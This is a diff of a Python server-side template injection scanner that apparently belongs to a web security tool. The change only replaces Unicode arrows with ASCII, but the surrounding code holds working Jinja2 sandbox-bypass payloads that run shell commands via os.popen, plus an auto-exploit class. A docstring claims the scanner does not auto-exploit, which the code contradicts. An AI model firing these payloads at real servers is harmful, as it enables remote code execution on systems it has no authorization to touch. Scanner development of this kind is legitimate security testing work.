@@ -2,7 +2,7 @@
 websecure.scanners.ssti
 ------------------------
 Server-Side Template Injection (SSTI) scanner.
-Three-tier approach: polyglot probe → engine fingerprinting → PoC evidence.
+Three-tier approach: polyglot probe -> engine fingerprinting -> PoC evidence.
 Attack surfaces: URL params, POST form data, JSON body, HTTP headers, cookies.
 """
 from __future__ import annotations
@@ -143,7 +143,7 @@ _TIER3_POC: Dict[str, List[str]] = {
 
 class SSTIScanner(BaseScanner):
     """
-    SSTI scanner with 3-tier detection: polyglot → fingerprint → PoC.
+    SSTI scanner with 3-tier detection: polyglot -> fingerprint -> PoC.
     Does NOT auto-exploit. Reports Critical severity on confirmation.
     """
 
@@ -181,7 +181,7 @@ class SSTIScanner(BaseScanner):
             inputs = form.get("inputs") or []
             self._scan_form(action, method, inputs)
 
-        # ─── Adım 5: Auto-exploit on confirmed SSTI findings ─────────────
+        # --- Adım 5: Auto-exploit on confirmed SSTI findings -------------
         self._run_auto_exploit(endpoints)
 
     def _run_auto_exploit(self, endpoints: List[str]) -> None:
@@ -529,13 +529,13 @@ def run(target: str, session=None, results=None, debug=False, **kwargs):
 
 _SSTI_SANDBOX_BYPASS: Dict[str, List[str]] = {
     "Jinja2": [
-        # __class__.__mro__ chain → OS
+        # __class__.__mro__ chain -> OS
         "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
         "{{lipsum.__globals__.os.popen('id').read()}}",
         "{{cycler.__init__.__globals__.os.popen('id').read()}}",
         "{{joiner.__init__.__globals__.os.popen('id').read()}}",
         "{{namespace.__init__.__globals__.os.popen('id').read()}}",
-        # builtins → __import__
+        # builtins -> __import__
         "{{config.__class__.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}",
         # subclasses index scan (Popen)
         "{{''.__class__.__mro__[1].__subclasses__()}}",
@@ -590,7 +590,7 @@ _RCE_OUTPUT_RE = re.compile(
 class SSTIAutoExploiter:
     """
     SSTI auto-exploitation after engine fingerprinting.
-    Sends sandbox bypass payloads → extracts real shell command output.
+    Sends sandbox bypass payloads -> extracts real shell command output.
     Single Responsibility: post-SSTI exploitation chain only.
     Open/Closed: extend _SANDBOX_BYPASS to add new engines.
     """
